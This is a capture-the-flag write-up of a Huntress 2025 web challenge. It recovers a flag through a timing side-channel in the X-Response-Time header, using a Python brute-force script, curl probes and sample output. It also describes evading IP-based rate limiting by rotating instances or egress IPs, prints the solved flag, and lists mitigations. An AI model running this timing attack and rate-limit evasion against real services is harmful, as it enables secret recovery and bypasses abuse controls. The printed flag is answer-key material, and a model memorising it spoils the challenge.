# Huntress 2025 — Emotional (Day 6) — Timing Attack Write‑Up
**Category:** Web  
**Goal:** Recover the flag without tripping anti‑bruteforce controls.  
**Author:** bland3man

---

## Challenge Summary
The app exposes a `Flag Checker` endpoint. Direct injection vectors (SQLi/NoSQLi/blind variants) didn’t pan out. However, every HTTP response included an `X-Response-Time` header that scaled with how many **prefix characters** of the submitted flag were correct. That pattern screams **timing side‑channel**.

The core idea: the server compares the candidate string to the real flag **character‑by‑character**; each correct character adds ~**0.100s** of delay. By measuring the time, we infer the longest correct prefix and extend it one character at a time until the full flag is recovered.

---

## Signal we keyed on
Two quick probes show the phenomenon:

```
# Wrong 5th char
GET /submit?flag=flag1x
X-Response-Time: 0.401433   # ≈ 4 chars matched

# Correct 5th char
GET /submit?flag=flag{x
X-Response-Time: 0.501856   # ≈ 5 chars matched
```

Empirically, each matched character shifts the header by ~0.100s. Once you notice the linear step, the rest is automation.

---

## Rate limiting gotcha
After ~**11 requests**, the instance blocks the IP:
```html
<h2>Stop Hacking!! Your IP has been blocked.</h2>
```
Workaround used during the event:
- Rotate to a **fresh instance URL** + corresponding **token** after 10–11 probes.
- Persist progress locally and resume from the last confirmed prefix.

(If you control networking you could also juggle egress IPs; I couldn’t here.)

---

## Repro script (Python)
This script measures `X-Response-Time` for each candidate character, chooses the max, and appends it to the prefix. The search alphabet is hex + digits (tuned to the event’s flag format). It **prompts** you for a fresh instance URL & token when you’re about to exceed the 11‑request window.

```python
import requests

target_url = ""
Token = ""

def set_values():
    global target_url, Token
    target_url = input("Set instance url: ").strip()
    Token = input("Set Token: ").strip()

def send_new_request(qpath):
    headers = {"Cookie": f"token={Token}"}
    url = target_url + qpath
    r = requests.get(url, headers=headers, timeout=10)
    # robust fallback if header missing
    return float(r.headers.get("X-Response-Time", "0"))

flag = "flag{"
alphabet = list("123456789abcdef0")  # tuned for hex-ish tail

while len(flag) < 38:  # 'flag{' + 32-hex
    print("Testing prefix:", flag + "}")
    set_values()
    best = ("", -1.0)
    for i, ch in enumerate(alphabet):
        if i == 10:  # keep under 11 calls / instance
            print("Only 11 requests allowed; switching instance...")
            set_values()
        q = "submit?flag=" + flag + ch + "}"
        t = send_new_request(q)
        print(ch, t)
        if t > best[1]:
            best = (ch, t)
    flag += best[0]
    print("Char detected:", best[0])

print("Flag:", flag + "}")
```

> Tip: If noise is high, take **3–5 measurements per character** and average; I didn’t need to here.

---

## Sample run (trimmed)
```
...snip...
https://7f4ddc1d.proxy.coursestack.com/submit?flag=flag{77a}  -> 0.702035
Switch instance
https://e0673fc9.proxy.coursestack.com/submit?flag=flag{77b}  -> 0.802738  # higher → winner
...snip...
https://a3a70259.proxy.coursestack.com/submit?flag=flag{...9} -> spike confirms final char
```

---

## Result
**Flag:** `flag{77ba0346d9565e77344b9fe40ecf1369}`

---

## Why this works
Typical “constant‑time” comparisons are *not* used; the checker returns as soon as a mismatch is found. That leaks prefix length via processing time (mirrored in `X-Response-Time`). Multiply by character count → reconstruct the flag deterministically.

**Mitigations** (for builders):
- Use constant‑time comparison (e.g., `crypto.timingSafeEqual` or equivalent).
- Add randomized jitter and aggregate checks.
- Enforce server‑side rate limiting *with* per‑token budget, not just per‑IP.

---

## Minimal curl probe (manual sanity check)
```bash
curl -sD - 'https://INSTANCE/submit?flag=flag{x}' \
  -H "Cookie: token=YOUR_TOKEN" | grep -i ^X-Response-Time
```

---

## Notes
- The 0.100s step is from this instance; expect variance.
- If the response header is missing, time the whole request client‑side and median‑filter the samples.
- Keep requests short and deterministic; avoid concurrent noise.

— end —
